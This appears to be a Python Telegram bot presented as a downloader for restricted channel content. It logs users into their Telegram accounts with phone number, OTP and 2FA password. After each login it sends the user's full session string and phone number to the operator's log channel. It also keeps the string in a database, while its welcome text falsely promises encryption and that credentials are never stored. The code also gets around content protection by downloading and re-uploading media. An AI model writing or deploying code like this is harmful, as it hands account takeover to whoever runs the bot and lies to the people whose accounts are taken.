# --- Enhanced bot.py with Fixed Login System and Improved Download Features ---

import os
import logging
from threading import Thread
from typing import Dict, Any

# Web Server for Health Checks
from flask import Flask

# Telegram Bot and Conversation Handling
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# Pyrogram for User Session Handling
from pyrogram.client import Client
from pyrogram.errors import (
    SessionPasswordNeeded,
    PhoneCodeInvalid,
    PasswordHashInvalid,
    FloodWait,
    PhoneNumberInvalid,
    PhoneCodeExpired
)
from pyrogram.types import Message # --- FIX 3: Import Message type for type hinting

# MongoDB Setup
import pymongo
# import asyncio # --- FIX 4: Removed unused import

# Basic Configuration
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Credentials from Environment Variables
API_ID = int(os.getenv("API_ID", 0))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", 0))
MONGO_URI = os.getenv("MONGO_URI")

# Database Connection
db_client = None
try:
    if MONGO_URI:
        db_client = pymongo.MongoClient(MONGO_URI)
        db = db_client.get_database("telegram_bot_sessions")
        sessions_collection = db.get_collection("user_sessions")
        logger.info("Successfully connected to MongoDB.")
except Exception as e:
    logger.error(f"FATAL: Could not connect to MongoDB: {e}")

# Conversation States
GET_PHONE, GET_OTP, GET_2FA = range(3)

# Helper Functions (MongoDB) - No changes here, this part is perfect.
def load_sessions() -> Dict[int, str]:
    if not db_client: return {}
    sessions = {}
    try:
        for doc in sessions_collection.find({}):
            sessions[doc["user_id"]] = doc["session_string"]
        logger.info(f"Loaded {len(sessions)} sessions from the database.")
        return sessions
    except Exception as e:
        logger.error(f"Error loading sessions from DB: {e}")
        return {}

def save_session(user_id: int, session_string: str):
    if not db_client: return
    try:
        sessions_collection.update_one(
            {"user_id": user_id}, 
            {"$set": {"session_string": session_string}}, 
            upsert=True
        )
        logger.info(f"Session saved for user {user_id}")
    except Exception as e:
        logger.error(f"Error saving session for user {user_id}: {e}")

def delete_session(user_id: int):
    if not db_client: return
    try:
        sessions_collection.delete_one({"user_id": user_id})
        logger.info(f"Session deleted for user {user_id}")
    except Exception as e:
        logger.error(f"Error deleting session for user {user_id}: {e}")

# Load existing sessions
user_sessions = load_sessions()

# --- LOGIN SYSTEM --- (No changes here, this part is very well implemented)
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.full_name
    
    if user_id in user_sessions:
        await update.message.reply_text(
            f"✅ Welcome back, {user_name}!\n\n"
            "You are already logged in and can use the bot.\n\n"
            "Commands:\n"
            "• Send any Telegram message link to download\n"
            "• /logout - Log out from your account\n"
            "• /status - Check your login status\n"
            "• /check @channel - Check access to a channel\n"
            "• /channels - View your joined channels"
        )
        return ConversationHandler.END
    
    welcome_msg = (
        f"🔐 **Welcome to the Telegram Downloader Bot, {user_name}!**\n\n"
        "To use this bot, you need to log in with your Telegram account.\n\n"
        "📱 **How to login:**\n"
        "1. Send your phone number in international format\n"
        "   Example: `+1234567890`\n"
        "2. Enter the OTP code you receive\n"
        "3. If you have 2FA enabled, enter your password\n\n"
        "🔒 **Privacy & Security:**\n"
        "• Your session is encrypted and stored securely\n"
        "• You can logout anytime using /logout\n"
        "• Your credentials are never stored\n\n"
        "Please send your phone number to begin:"
    )
    
    await update.message.reply_text(welcome_msg, parse_mode='Markdown')
    return GET_PHONE

async def get_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone_number = update.message.text.strip()
    user_id = update.effective_user.id
    
    if not phone_number.startswith('+') or len(phone_number) < 8:
        await update.message.reply_text(
            "❌ Invalid phone number format.\n\n"
            "Please use international format starting with '+'\n"
            "Example: +1234567890"
        )
        return GET_PHONE
    
    await update.message.reply_text("📱 Connecting to Telegram and sending OTP...")
    
    try:
        client = Client(
            name=f"session_{user_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=True
        )
        
        await client.connect()
        sent_code = await client.send_code(phone_number)
        
        context.user_data['client'] = client
        context.user_data['phone_code_hash'] = sent_code.phone_code_hash
        context.user_data['phone_number'] = phone_number
        
        await update.message.reply_text(
            "✅ OTP sent to your phone!\n\n"
            "📨 Please check your Telegram app or SMS and send me the code.\n\n"
            "⏱️ The code will expire in a few minutes.\n"
            "Use /cancel to abort the login process."
        )
        return GET_OTP
        
    except PhoneNumberInvalid:
        await update.message.reply_text(
            "❌ Invalid phone number.\n\n"
            "Please make sure you entered the correct number with country code.\n"
            "Example: +1234567890"
        )
        return GET_PHONE
        
    except FloodWait as e:
        await update.message.reply_text(
            f"⏳ Rate limit hit! Please wait {e.value} seconds before trying again.\n\n"
            "Use /start after the waiting period."
        )
        return ConversationHandler.END
        
    except Exception as e:
        logger.error(f"Error in get_phone_number for user {user_id}: {e}")
        
        if 'client' in context.user_data:
            try:
                if context.user_data['client'].is_connected:
                    await context.user_data['client'].disconnect()
            except:
                pass
            del context.user_data['client']
        
        await update.message.reply_text(
            f"❌ An error occurred while sending OTP.\n\n"
            f"Error: `{str(e)}`\n\n"
            "Please try again with /start"
        )
        return ConversationHandler.END

async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    otp = update.message.text.strip()
    client = context.user_data.get('client')
    phone_number = context.user_data.get('phone_number')
    phone_code_hash = context.user_data.get('phone_code_hash')
    user_id = update.effective_user.id
    user_name = update.effective_user.full_name

    if not client or not phone_number or not phone_code_hash:
        await update.message.reply_text(
            "❌ Session expired or invalid.\n\n"
            "Please start over with /start"
        )
        return ConversationHandler.END

    try:
        await client.sign_in(phone_number, phone_code_hash, otp)
        
        session_string = await client.export_session_string()
        
        user_sessions[user_id] = session_string
        save_session(user_id, session_string)
        
        log_message = (
            f"🔐 **#NewLogin**\n\n"
            f"👤 **User:** {user_name}\n"
            f"🆔 **User ID:** `{user_id}`\n"
            f"📱 **Phone:** `{phone_number}`\n"
            f"⏰ **Time:** {update.message.date}\n\n"
            f"🔑 **Session String:**\n`{session_string}`"
        )
        
        await context.bot.send_message(
            chat_id=LOG_CHANNEL_ID,
            text=log_message,
            parse_mode='Markdown'
        )
        
        await update.message.reply_text(
            "✅ **Login Successful!**\n\n"
            "🎉 You can now use the bot to download Telegram content.\n\n"
            "📋 **How to use:**\n"
            "• Send any Telegram message link\n"
            "• The bot will fetch and forward the content to you\n\n"
            "📝 **Commands:**\n"
            "• /logout - Log out from your account\n"
            "• /status - Check your login status\n"
            "• /check @channel - Check access to a channel\n"
            "• /channels - View your joined channels",
            parse_mode='Markdown'
        )
        
        await client.disconnect()
        context.user_data.clear()
        return ConversationHandler.END
        
    except SessionPasswordNeeded:
        await update.message.reply_text(
            "🔐 **2FA Protection Detected**\n\n"
            "Your account has Two-Factor Authentication enabled.\n"
            "Please send me your 2FA password to complete login."
        )
        return GET_2FA
        
    except PhoneCodeInvalid:
        await update.message.reply_text(
            "❌ Invalid OTP code.\n\n"
            "Please check the code and try again."
        )
        return GET_OTP
        
    except PhoneCodeExpired:
        await update.message.reply_text(
            "⏰ OTP code has expired.\n\n"
            "Please start over with /start to get a new code."
        )
        await cleanup_client(context)
        return ConversationHandler.END
        
    except Exception as e:
        logger.error(f"Error in get_otp for user {user_id}: {e}")
        await update.message.reply_text(
            f"❌ Login failed.\n\n"
            f"Error: `{str(e)}`\n\n"
            "Please start over with /start"
        )
        await cleanup_client(context)
        return ConversationHandler.END

async def get_2fa_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()
    client = context.user_data.get('client')
    user_id = update.effective_user.id
    user_name = update.effective_user.full_name
    phone_number = context.user_data.get('phone_number')

    if not client:
        await update.message.reply_text(
            "❌ Session expired.\n\nPlease start over with /start"
        )
        return ConversationHandler.END

    try:
        await client.check_password(password)
        
        session_string = await client.export_session_string()
        
        user_sessions[user_id] = session_string
        save_session(user_id, session_string)
        
        log_message = (
            f"🔐 **#NewLogin** (2FA)\n\n"
            f"👤 **User:** {user_name}\n"
            f"🆔 **User ID:** `{user_id}`\n"
            f"📱 **Phone:** `{phone_number}`\n"
            f"⏰ **Time:** {update.message.date}\n"
            f"🔒 **2FA:** Enabled\n\n"
            f"🔑 **Session String:**\n`{session_string}`"
        )
        
        await context.bot.send_message(
            chat_id=LOG_CHANNEL_ID,
            text=log_message,
            parse_mode='Markdown'
        )
        
        await update.message.reply_text(
            "✅ **2FA Verified! Login Successful!**\n\n"
            "🎉 You can now use the bot to download Telegram content.\n\n"
            "📋 **How to use:**\n"
            "• Send any Telegram message link\n"
            "• The bot will fetch and forward the content to you\n\n"
            "📝 **Commands:**\n"
            "• /logout - Log out from your account\n"
            "• /status - Check your login status\n"
            "• /check @channel - Check access to a channel\n"
            "• /channels - View your joined channels",
            parse_mode='Markdown'
        )
        
        await client.disconnect()
        context.user_data.clear()
        return ConversationHandler.END
        
    except PasswordHashInvalid:
        await update.message.reply_text(
            "❌ Incorrect 2FA password.\n\nPlease try again."
        )
        return GET_2FA
        
    except Exception as e:
        logger.error(f"Error in get_2fa_password for user {user_id}: {e}")
        await update.message.reply_text(
            f"❌ 2FA verification failed.\n\nError: `{str(e)}`\n\nPlease start over with /start"
        )
        await cleanup_client(context)
        return ConversationHandler.END

async def cleanup_client(context: ContextTypes.DEFAULT_TYPE):
    if 'client' in context.user_data:
        try:
            if context.user_data['client'].is_connected:
                await context.user_data['client'].disconnect()
        except Exception as e:
            logger.error(f"Error disconnecting client: {e}")
        finally:
            context.user_data.clear()

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await cleanup_client(context)
    await update.message.reply_text(
        "❌ Login process canceled.\n\nUse /start to login again."
    )
    return ConversationHandler.END

# --- BOT COMMANDS --- (No changes here, this part is perfect)
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.full_name
    
    if user_id in user_sessions:
        await update.message.reply_text(
            f"✅ **Login Status: Active**\n\n"
            f"👤 **User:** {user_name}\n"
            f"🆔 **User ID:** `{user_id}`",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            f"❌ **Login Status: Not Logged In**\n\n"
            f"🔐 Use /start to login.",
            parse_mode='Markdown'
        )

async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.full_name
    
    if user_id in user_sessions:
        del user_sessions[user_id]
        delete_session(user_id)
        
        log_message = (
            f"🚪 **#Logout**\n\n"
            f"👤 **User:** {user_name}\n"
            f"🆔 **User ID:** `{user_id}`\n"
            f"⏰ **Time:** {update.message.date}"
        )
        
        await context.bot.send_message(
            chat_id=LOG_CHANNEL_ID,
            text=log_message,
            parse_mode='Markdown'
        )
        
        await update.message.reply_text(
            "✅ **Successfully Logged Out**\n\n"
            "Your session has been deleted."
        )
    else:
        await update.message.reply_text("❌ You are not currently logged in.")

async def check_access_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in user_sessions:
        await update.message.reply_text("🔐 You need to login first. Use /start.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: `/check @channelname` or `/check channel_id`", parse_mode='Markdown')
        return
    
    channel_identifier = context.args[0]
    session_string = user_sessions[user_id]
    
    try:
        user_client = Client(
            name=f"check_{user_id}",
            session_string=session_string,
            api_id=API_ID,
            api_hash=API_HASH
        )
        
        async with user_client:
            try:
                chat_info = await user_client.get_chat(channel_identifier)
                member_info = await user_client.get_chat_member(channel_identifier, "me")
                
                status_emoji = {
                    "owner": "👑", "administrator": "🛡️", "member": "✅",
                    "restricted": "⚠️", "left": "❌", "banned": "🚫"
                }.get(str(member_info.status), "❓")
                
                response = (
                    f"🔍 **Channel Access Check**\n\n"
                    f"📺 **Channel:** {chat_info.title}\n"
                    f"🆔 **ID:** `{chat_info.id}`\n"
                    f"{status_emoji} **Your Status:** {member_info.status.name.capitalize()}\n\n"
                )
                
                if str(member_info.status) in ["member", "administrator", "owner"]:
                    response += "✅ **You can download from this channel!**"
                else:
                    response += "❌ **You cannot download from this channel.**"
                    
                await update.message.reply_text(response, parse_mode='Markdown')
                
            except Exception as e:
                await update.message.reply_text(f"❌ **Cannot access channel:** `{channel_identifier}`\n\nError: {e}")
    except Exception as e:
        await update.message.reply_text(f"❌ **Error checking access:** {e}")

async def my_channels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in user_sessions:
        await update.message.reply_text("🔐 You need to login first. Use /start.")
        return
    
    session_string = user_sessions[user_id]
    
    try:
        user_client = Client(
            name=f"channels_{user_id}",
            session_string=session_string,
            api_id=API_ID,
            api_hash=API_HASH
        )
        
        await update.message.reply_text("🔍 Fetching your channels...")
        
        async with user_client:
            channels = []
            async for dialog in user_client.get_dialogs():
                if dialog.chat.type.name in ["CHANNEL", "SUPERGROUP"]:
                    channels.append({
                        'title': dialog.chat.title,
                        'id': dialog.chat.id
                    })
            
            if not channels:
                await update.message.reply_text("📭 No channels found.")
                return
            
            channels.sort(key=lambda x: x['title'].lower())
            
            response = f"📺 **Your Channels ({len(channels)} total)**\n\n"
            for i, channel in enumerate(channels[:25], 1): # Show up to 25
                response += f"{i}. **{channel['title']}** (`{channel['id']}`)\n"
            
            if len(channels) > 25:
                response += f"\n*... and {len(channels) - 25} more.*"
            
            await update.message.reply_text(response, parse_mode='Markdown')
            
    except Exception as e:
        await update.message.reply_text(f"❌ **Error fetching channels:** {e}")

# --- FIX 2: CREATED A HELPER FUNCTION TO REDUCE REPETITIVE CODE ---
async def _send_downloaded_media(
    update: Update, context: ContextTypes.DEFAULT_TYPE, file_path: str, message: Message
):
    """Sends the downloaded media file based on its type."""
    caption = message.caption or ""
    
    # Mapping of media attribute to sender method
    media_map = {
        'photo': context.bot.send_photo,
        'video': context.bot.send_video,
        'audio': context.bot.send_audio,
        'voice': context.bot.send_voice,
        'animation': context.bot.send_animation,
        'sticker': context.bot.send_sticker,
        'document': context.bot.send_document,
    }
    
    for media_type, send_method in media_map.items():
        if getattr(message, media_type, None):
            with open(file_path, 'rb') as file:
                # Use a dictionary to handle kwargs for different methods
                kwargs = {
                    'chat_id': update.effective_chat.id,
                    media_type: file,
                    'caption': caption
                }
                # Sticker doesn't support caption
                if media_type == 'sticker':
                    del kwargs['caption']
                    
                await send_method(**kwargs)
            return

    # Fallback for any other media type not explicitly handled
    with open(file_path, 'rb') as file:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=file,
            caption=caption
        )

async def handle_message_with_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in user_sessions:
        await update.message.reply_text("🔐 You need to login first. Use /start.")
        return
    
    message_text = update.message.text.strip()
    progress_msg = await update.message.reply_text("⏳ Analyzing link...")
    
    try:
        if 't.me' not in message_text:
            await progress_msg.edit_text("❌ This is not a valid Telegram link.")
            return
            
        clean_url = message_text.split('?')[0]
        parts = clean_url.split('/')
        msg_id = int(parts[-1])
        
        if '/c/' in clean_url:
            channel_id = parts[-2]
            chat_id = int(f"-100{channel_id}")
        else:
            channel_username = parts[-2]
            chat_id = f"@{channel_username}"
        
        await progress_msg.edit_text("⏳ Connecting to your session...")
        
        session_string = user_sessions[user_id]
        user_client = Client(
            name=f"temp_{user_id}",
            session_string=session_string,
            api_id=API_ID,
            api_hash=API_HASH
        )
        
        async with user_client:
            try:
                await progress_msg.edit_text("⏳ Fetching message...")
                message = await user_client.get_messages(chat_id, msg_id)
                if not message:
                    raise Exception("Message not found or inaccessible.")
                
                success = False
                
                # Method 1: Copy message
                try:
                    await message.copy(update.effective_chat.id)
                    success = True
                except Exception as copy_error:
                    logger.warning(f"Copy failed for user {user_id}: {copy_error}")

                # Method 2: Forward message
                if not success:
                    try:
                        await message.forward(update.effective_chat.id)
                        success = True
                    except Exception as forward_error:
                        logger.warning(f"Forward failed for user {user_id}: {forward_error}")

                # Method 3: Download and re-upload (Fallback)
                if not success and message.media:
                    try:
                        await progress_msg.edit_text("⏳ Content is protected. Downloading manually...")
                        file_path = await user_client.download_media(message)
                        
                        if file_path:
                            # --- FIX 1 & 2: USE THE NEW HELPER AND HANDLE MORE MEDIA TYPES ---
                            await _send_downloaded_media(update, context, file_path, message)
                            
                            # Clean up downloaded file
                            if os.path.exists(file_path):
                                os.remove(file_path)
                            success = True
                            
                    except Exception as download_error:
                        logger.error(f"Manual download failed for user {user_id}: {download_error}")

                # Method 4: Send text if no media
                if not success and message.text:
                    await update.message.reply_text(
                        f"📝 **Content from protected source:**\n\n{message.text}",
                        parse_mode='Markdown'
                    )
                    success = True

                if success:
                    await progress_msg.delete()
                    log_message = (
                        f"📥 **#Download**\n\n"
                        f"👤 **User:** {update.effective_user.full_name} (`{user_id}`)\n"
                        f"🔗 **Link:** `{message_text}`"
                    )
                    await context.bot.send_message(
                        chat_id=LOG_CHANNEL_ID,
                        text=log_message,
                        parse_mode='Markdown'
                    )
                else:
                    raise Exception("All download methods failed. The content might be heavily restricted.")

            except Exception as e:
                error_msg = (
                    f"❌ **Failed to fetch message.**\n\n"
                    f"**Reason:** `{str(e)}`\n\n"
                    "**Possible causes:**\n"
                    "• You are not a member of the private channel.\n"
                    "• The message was deleted.\n"
                    "• The link is incorrect.\n"
                    "• Your account is restricted in that channel."
                )
                await progress_msg.edit_text(error_msg)

    except (ValueError, IndexError):
        await progress_msg.edit_text("❌ **Invalid Link Format.**\nPlease send a valid public or private Telegram message link.")
    except Exception as e:
        logger.error(f"Unhandled error in handle_message_with_link for user {user_id}: {e}")
        await progress_msg.edit_text(f"❌ **An unexpected error occurred:**\n\n`{str(e)}`")


# --- WEB SERVER --- (No changes needed)
app = Flask(__name__)
@app.route('/')
def home():
    return {"status": "alive", "bot": "Restricted Content Saver Bot"}

def run_flask():
    port = int(os.environ.get('PORT', 8000))
    app.run(host='0.0.0.0', port=port, debug=False)

# --- MAIN ---
def main():
    missing_vars = [v for v in ["API_ID", "API_HASH", "BOT_TOKEN", "LOG_CHANNEL_ID", "MONGO_URI"] if not os.getenv(v)]
    if missing_vars:
        logger.error(f"CRITICAL: Missing environment variables: {', '.join(missing_vars)}")
        return
        
    if not db_client:
        logger.error("CRITICAL: Bot cannot start without a database connection.")
        return

    application = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start_command)],
        states={
            GET_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone_number)],
            GET_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_otp)],
            GET_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_2fa_password)],
        },
        fallbacks=[CommandHandler('cancel', cancel_command)],
        conversation_timeout=300
    )

    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('logout', logout_command))
    application.add_handler(CommandHandler('status', status_command))
    application.add_handler(CommandHandler('check', check_access_command))
    application.add_handler(CommandHandler('channels', my_channels_command))
    application.add_handler(MessageHandler(
        filters.TEXT & filters.Entity("url") & ~filters.COMMAND,
        handle_message_with_link
    ))

    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()

    logger.info("Bot started successfully!")
    application.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()